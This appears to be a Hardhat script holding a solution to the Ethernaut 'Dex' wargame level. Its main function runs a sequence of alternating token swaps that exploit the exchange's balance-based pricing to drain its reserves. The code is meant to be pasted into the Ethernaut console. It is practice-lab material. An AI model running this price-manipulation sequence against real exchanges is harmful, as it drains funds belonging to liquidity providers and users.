// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {
  //! This time we gotta use our own wallet to attack cause challenge deploys according to our wallet address
  //! Write down the codes into ethernaut consoles...

  await contract.approve(contract.address, 500)

  t1 = await contract.token1()
  t2 = await contract.token2()

  await contract.swap(t1, t2, 10)
  await contract.swap(t2, t1, 20)
  await contract.swap(t1, t2, 24)
  await contract.swap(t2, t1, 30)
  await contract.swap(t1, t2, 41)
  await contract.swap(t2, t1, 45)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
